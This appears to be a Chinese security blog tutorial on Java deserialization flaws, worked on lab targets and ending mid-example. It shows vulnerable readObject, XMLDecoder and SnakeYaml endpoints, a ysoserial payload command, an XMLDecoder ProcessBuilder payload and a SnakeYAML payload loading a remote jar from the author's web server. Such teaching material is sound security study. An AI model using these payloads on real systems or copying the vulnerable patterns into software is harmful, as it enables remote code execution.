<!doctype html><html lang=en><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="反序列化 序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程， java序列化的数据一般会以标记(ac ed 00 0"><meta name=keywords content=",sec/javasec"><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://l1uyun.one/posts/2024/08/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/><title>javasec-反序列化 | l1uyun☁️ — l1uyun's Blog
</title><link rel=stylesheet href=https://l1uyun.one/main.7ec86b545988b95db913eae589911b139b09ce5bdcae9ce4a659ba5efa58ffe3.css integrity="sha256-fshrVFmIuV25E+rliZEbE5sJzlvcrpzkplm6XvpY/+M="><link rel=apple-touch-icon sizes=180x180 href=https://l1uyun.one/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://l1uyun.one/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://l1uyun.one/favicon-16x16.png><link rel=manifest href=https://l1uyun.one/site.webmanifest><link rel=mask-icon href=https://l1uyun.one/safari-pinned-tab.svg color><link rel="shortcut icon" href=https://l1uyun.one/favicon.ico><meta name=msapplication-TileColor content><meta itemprop=name content="javasec-反序列化"><meta itemprop=description content="反序列化 序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程， java序列化的数据一般会以标记(ac ed 00 0"><meta itemprop=datePublished content="2024-08-01T00:00:00+00:00"><meta itemprop=dateModified content="2024-08-01T00:00:00+00:00"><meta itemprop=wordCount content="3019"><meta itemprop=keywords content="Sec/Javasec"><meta name=twitter:card content="summary"><meta name=twitter:title content="javasec-反序列化"><meta name=twitter:description content="反序列化 序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程， java序列化的数据一般会以标记(ac ed 00 0"><meta property="og:url" content="https://l1uyun.one/posts/2024/08/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><meta property="og:site_name" content="l1uyun☁️"><meta property="og:title" content="javasec-反序列化"><meta property="og:description" content="反序列化 序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程， java序列化的数据一般会以标记(ac ed 00 0"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-01T00:00:00+00:00"><meta property="article:modified_time" content="2024-08-01T00:00:00+00:00"><meta property="article:tag" content="Sec/Javasec"><meta property="article:published_time" content="2024-08-01 00:00:00 +0000 UTC"><script async src="https://www.googletagmanager.com/gtag/js?id=G-RSXEZVCJT4"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-RSXEZVCJT4")</script><link rel=stylesheet href=https://unpkg.com/swiper/swiper-bundle.min.css><script src=https://unpkg.com/swiper/swiper-bundle.min.js></script><link rel=stylesheet href=https://l1uyun.one/css/custom.css></head><body><div class=container><header class=header><span class=header__inner><a href=https://l1uyun.one/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>$ cd /home/l1uyun☁️ </span><span class=logo__cursor style=background-color:#87ceeb></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://l1uyun.one/posts/>Posts</a></li><li><a href=https://l1uyun.one/tags/>Tags</a></li><li><a href=https://l1uyun.one/about/>About</a></li></ul></nav><span class=menu-trigger><svg viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span><span class="theme-toggle not-selectable"><svg class="theme-toggler" width="22" height="22" viewBox="0 0 48 48" fill="none"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info><p></p><hr><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
<span class=tag><a href=https://l1uyun.one/tags/sec/javasec/>sec/javasec</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
2024-08-01 00:00</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
3019 Words
<span>&nbsp;&nbsp;</span>
<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
7 minutes</p></div><hr><article><h1 class=post-title><a href=https://l1uyun.one/posts/2024/08/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>javasec-反序列化</a></h1><div class=post-content><h1 id=反序列化>反序列化</h1><p>序列化是将Java对象转换成字节流的过程。而反序列化是将字节流转换成Java对象的过程，
java序列化的数据一般会以标记(ac ed 00 05)开头，base64编码的特征为rO0AB，</p><p>JAVA常见的序列化和反序列化的方法有JAVA 原生序列化和JSON 类（fastjson、jackson）序列化等。</p><h2 id=前置知识>前置知识</h2><h3 id=为什么要序列化>为什么要序列化?</h3><p>对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时候就需要序列化技术。</p><p>Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。</p><p>反序列化条件：</p><ul><li>该类必须实现 java.io.Serializable 对象</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的序列化过程：</li></ul><ol><li>序列化：将 OutputStream 封装在 ObjectOutputStream 内，然后调用 writeObject 即可</li><li>反序列化：将 InputStream 封装在 ObjectInputStream 内，然后调用 readObject 即可反序列化出错可能原因</li><li>序列化字节码中的 serialVersionUID(用于记录java序列化版本)在进行反序列化时，JVM 会把传来的字节流中的 serialVersionUID 与本地相应实体类的 serialVersionUID 进行比较，如果相同就认为是一致的，可以进行反序列化，否则就抛出序列化版本不一致的异常- InvalidCastException</li></ol><h3 id=objectoutputstream>ObjectOutputStream</h3><p>java.io.ObjectOutputStream 类，将Java对象的原始数据类型写出到文件,实现对象的持久存储。</p><p>一个对象要想序列化，必须满足两个条件:
1.该类必须实现 java.io.Serializable 接口， Serializable 是一个标记接口，不实现此接口的类将不会
使任何状态序列化或反序列化，会抛出 NotSerializableException 。
2.该类的所有属性必须是可序列化的。如果有一个属性不需要可序列化的，则该属性必须注明是瞬态的，使用transient 关键字修饰。</p><p>示例:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#6e7681> </span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>class</span> <span style=color:#f0883e;font-weight:700>Employee</span><span style=color:#6e7681> </span><span style=color:#ff7b72>implements</span><span style=color:#6e7681> </span>java.io.Serializable{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span>String<span style=color:#6e7681> </span>name;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span>String<span style=color:#6e7681> </span>address;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>transient</span><span style=color:#6e7681> </span><span style=color:#ff7b72>int</span><span style=color:#6e7681> </span>age;<span style=color:#6e7681> </span><span style=color:#8b949e;font-style:italic>// transient瞬态修饰成员,不会被序列化</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>void</span><span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>addressCheck</span>()<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>   </span>System.out.println(<span style=color:#a5d6ff>&#34;Address check : &#34;</span><span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>+</span><span style=color:#6e7681> </span>name<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>+</span><span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34; -- &#34;</span><span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>+</span><span style=color:#6e7681> </span>address);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span><span style=color:#8b949e;font-style:italic>//此处省略tostring等方法</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span>}<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>class</span> <span style=color:#f0883e;font-weight:700>SerializeDemo</span><span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>static</span><span style=color:#6e7681> </span><span style=color:#ff7b72>void</span><span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>main</span>(String<span style=color:#ff7b72;font-weight:700>[]</span><span style=color:#6e7681> </span>args)<span style=color:#6e7681> </span><span style=color:#ff7b72>throws</span><span style=color:#6e7681> </span>IOException<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>   </span>Employee<span style=color:#6e7681> </span>e<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>Employee();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>   </span>e.name<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34;zhangsan&#34;</span>;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>   </span>e.age<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span>20;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>   </span>e.address<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34;shenzhen&#34;</span>;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>     </span><span style=color:#8b949e;font-style:italic>// 创建序列化流</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>     </span>ObjectOutputStream<span style=color:#6e7681> </span>outputStream<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>ObjectOutputStream(<span style=color:#ff7b72>new</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>FileOutputStream(<span style=color:#a5d6ff>&#34;ser.txt&#34;</span>));<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>     </span><span style=color:#8b949e;font-style:italic>// 写出对象</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>     </span>outputStream.writeObject(e);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>     </span><span style=color:#8b949e;font-style:italic>// 释放资源</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>     </span>outputStream.close();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681> </span>}<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><h3 id=objectinputstream>ObjectInputStream</h3><p>如果能找到一个对象的class文件，我们可以进行反序列化操作，调用 ObjectInputStream 读取对象的方法</p><pre tabindex=0><code>ObjectInputStream.readObject()：任何类如果想要序列化必须实现java.io.Serializable接口
</code></pre><h3 id=原生序列化类函数>原生序列化类函数</h3><pre tabindex=0><code>-SnakeYaml：完整的YAML1.1规范Processor，支持Java对象的序列化/反序列化
-XMLDecoder：xml语言格式序列化类函数接口
-ObjectInputStream.readObject()：任何类如果想要序列化必须实现java.io.Serializable接口
</code></pre><h2 id=涉及工具>涉及工具</h2><p>靶机平台还是这两个</p><ul><li><a href=https://github.com/j3ers3/Hello-Java-Sec>Hello-Java-Sec</a></li><li><a href=https://github.com/bewhale/JavaSec>JavaSec</a></li></ul><p>利用工具,后面两个工具集成了第一个</p><pre tabindex=0><code>https://github.com/frohoff/ysoserial
Yakit https://yaklang.com/
https://github.com/NotSoSecure/SerializedPayloadGenerator
</code></pre><h2 id=漏洞基本原理>漏洞基本原理</h2><p>在Java反序列化中，会调用被反序列化对象的readObject方法，当readObject方法被<strong>重写不当</strong>时产生漏洞</p><p>此处重写了readObject方法，执行Runtime.getRuntime().exec(),
defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法</p><p>运行流程：
1.People对象序列化进object文件
2.object文件反序列化对象->调用自身的readObject方法->执行Runtime.getRuntime().exec(&ldquo;calc.exe&rdquo;);</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#6e7681>    </span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>People</span>(String<span style=color:#6e7681> </span>name,<span style=color:#6e7681> </span>String<span style=color:#6e7681> </span>sex,<span style=color:#6e7681> </span><span style=color:#ff7b72>int</span><span style=color:#6e7681> </span>age)<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#ff7b72>this</span>.name<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span>name;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#ff7b72>this</span>.sex<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span>sex;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#ff7b72>this</span>.age<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span>age;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><p>接着重写readObject方法.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff7b72>private</span><span style=color:#6e7681> </span><span style=color:#ff7b72>void</span><span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>readObject</span>(ObjectInputStream<span style=color:#6e7681> </span>objInputStream)<span style=color:#6e7681> </span><span style=color:#ff7b72>throws</span><span style=color:#6e7681> </span>IOException,<span style=color:#6e7681> </span>ClassNotFoundException<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#8b949e;font-style:italic>// 先调用默认的反序列化方法，即readObject</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span>objInputStream.defaultReadObject();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span><span style=color:#8b949e;font-style:italic>// 再执行自己的代码逻辑，例如执行系统命令</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>        </span>Runtime.getRuntime().exec(<span style=color:#a5d6ff>&#34;calc.exe&#34;</span>);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><p>然后去进行序列化</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>static</span><span style=color:#6e7681> </span><span style=color:#ff7b72>void</span><span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>main</span>(String<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>[]</span><span style=color:#6e7681> </span>args)<span style=color:#6e7681> </span><span style=color:#ff7b72>throws</span><span style=color:#6e7681> </span>IOException,<span style=color:#6e7681> </span>ClassNotFoundException<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>	</span>People<span style=color:#6e7681> </span>people<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>People(<span style=color:#a5d6ff>&#34;ZhangSan&#34;</span>,<span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34;boy&#34;</span>,<span style=color:#6e7681> </span>18);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>	</span><span style=color:#8b949e;font-style:italic>// 先序列化People对象</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>	</span><span style=color:#ff7b72>byte</span><span style=color:#ff7b72;font-weight:700>[]</span><span style=color:#6e7681> </span>byteStream<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span>SerializeDemo.Serialize(people);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>	</span><span style=color:#8b949e;font-style:italic>// 再反序列化</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>	</span>SerializeDemo.DeSerialize(byteStream);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><p>共同条件：继承 Serializable</p><ul><li>入口类 source （即找到,重写readObject方法，调用常见的函数，参数类型宽泛 最好 jdk 自带）</li><li>调用链 gadget chain （基于类的默认方式调用）</li><li>执行类 sink （RCE、SSRF、写文件等操作）</li></ul><h2 id=漏洞分析>漏洞分析</h2><h3 id=漏洞代码>漏洞代码</h3><p>靶机平台上的</p><h4 id=objectinputstream-1>ObjectInputStream</h4><pre tabindex=0><code>// readObject，读取输入流,并转换对象。ObjectInputStream.readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象。
// 生成payload：java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections5 &#34;open -a Calculator&#34; | base64

public String cc(String base64) {
    try {
        base64 = base64.replace(&#34; &#34;, &#34;+&#34;);
        byte[] bytes = Base64.getDecoder().decode(base64);

        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);

        // 反序列化流，将序列化的原始数据恢复为对象
        ObjectInputStream in = new ObjectInputStream(stream);
        in.readObject();
        in.close();
        return &#34;反序列化漏洞&#34;;
    } catch (Exception e) {
        return e.toString();
    }
}
</code></pre><p>ObjectInputStream.readObject,将对象给恢复,调用恢复对象的readObject方法,执行命令
<img alt=|600 src=https://img.l1uyun.one/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_image_1.png></p><h4 id=xmldecoder>XMLDecoder</h4><p>也是一样的,只不过是换成了xmldecode.readObject</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>String<span style=color:#6e7681> </span>path<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#a5d6ff>&#34;src/main/resources/payload/calc-1.xml&#34;</span>;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>File<span style=color:#6e7681> </span>file<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>File(path);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>FileInputStream<span style=color:#6e7681> </span>fis<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#79c0ff>null</span>;<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span><span style=color:#ff7b72>try</span><span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>fis<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>FileInputStream(file);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681> </span><span style=color:#ff7b72>catch</span><span style=color:#6e7681> </span>(Exception<span style=color:#6e7681> </span>e)<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>e.printStackTrace();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>BufferedInputStream<span style=color:#6e7681> </span>bis<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>BufferedInputStream(fis);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>XMLDecoder<span style=color:#6e7681> </span>xmlDecoder<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>XMLDecoder(bis);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>xmlDecoder.readObject();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>xmlDecoder.close();<span style=color:#6e7681>
</span></span></span></code></pre></div><p>传输的数据是xml格式</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#7ee787>&lt;java</span> version=<span style=color:#a5d6ff>&#34;1.8.0_151&#34;</span> class=<span style=color:#a5d6ff>&#34;java.beans.XMLDecoder&#34;</span><span style=color:#7ee787>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#7ee787>&lt;object</span> class=<span style=color:#a5d6ff>&#34;java.lang.ProcessBuilder&#34;</span><span style=color:#7ee787>&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#7ee787>&lt;array</span> class=<span style=color:#a5d6ff>&#34;java.lang.String&#34;</span> length=<span style=color:#a5d6ff>&#34;3&#34;</span><span style=color:#7ee787>&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#7ee787>&lt;void</span> index=<span style=color:#a5d6ff>&#34;0&#34;</span><span style=color:#7ee787>&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#7ee787>&lt;string&gt;</span>cmd<span style=color:#7ee787>&lt;/string&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#7ee787>&lt;/void&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#7ee787>&lt;void</span> index=<span style=color:#a5d6ff>&#34;1&#34;</span><span style=color:#7ee787>&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#7ee787>&lt;string&gt;</span>/c<span style=color:#7ee787>&lt;/string&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#7ee787>&lt;/void&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#7ee787>&lt;void</span> index=<span style=color:#a5d6ff>&#34;2&#34;</span><span style=color:#7ee787>&gt;</span>
</span></span><span style=display:flex><span>                <span style=color:#7ee787>&lt;string&gt;</span>calc<span style=color:#7ee787>&lt;/string&gt;</span>
</span></span><span style=display:flex><span>            <span style=color:#7ee787>&lt;/void&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#7ee787>&lt;/array&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#7ee787>&lt;void</span> method=<span style=color:#a5d6ff>&#34;start&#34;</span> <span style=color:#7ee787>/&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#7ee787>&lt;/object&gt;</span>
</span></span><span style=display:flex><span><span style=color:#7ee787>&lt;/java&gt;</span>
</span></span></code></pre></div><p><img src=https://img.l1uyun.one/javasec-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_image_2.png></p><h4 id=snakeyaml>SnakeYaml</h4><p>SnakeYAML 反序列化,
SnakeYAML 在反序列化时可以指定 class 类型和构造方法的参数,
结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#8b949e;font-style:italic>// 远程服务器支持用户可以输入yaml格式的内容并且进行数据解析，没有做沙箱，黑名单之类的防控</span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span><span style=color:#ff7b72>public</span><span style=color:#6e7681> </span><span style=color:#ff7b72>void</span><span style=color:#6e7681> </span><span style=color:#d2a8ff;font-weight:700>yaml</span>(String<span style=color:#6e7681> </span>content)<span style=color:#6e7681> </span>{<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>Yaml<span style=color:#6e7681> </span>y<span style=color:#6e7681> </span><span style=color:#ff7b72;font-weight:700>=</span><span style=color:#6e7681> </span><span style=color:#ff7b72>new</span><span style=color:#6e7681> </span>Yaml();<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span>y.load(content);<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>}<span style=color:#6e7681>
</span></span></span></code></pre></div><p>只不过传输的数据不是object格式了,而是yaml格式
使用了<a href=https://github.com/artsploit/yaml-payload>yaml-payload</a>这个工具,编译得到一个payload.jar,放在wsl里面,并且开一个web服务器.</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>!!javax.script.ScriptEngineManager</span><span style=color:#6e7681> </span>[<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>  </span><span style=color:#8b949e;font-weight:700;font-style:italic>!!java.net.URLClassLoader</span><span style=color:#6e7681> </span>[[<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>    </span><span style=color:#8b949e;font-weight:700;font-style:italic>!!java.net.URL</span><span style=color:#6e7681> </span>[<span style=color:#a5d6ff>&#34;http://192.168.10.7:8000/yaml-payload.jar&#34;</span>]<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681>  </span>]]<span style=color:#6e7681>
</span></span></span><span style=display:flex><span><span style=color:#6e7681></span>]<span style=color:#6e7681>
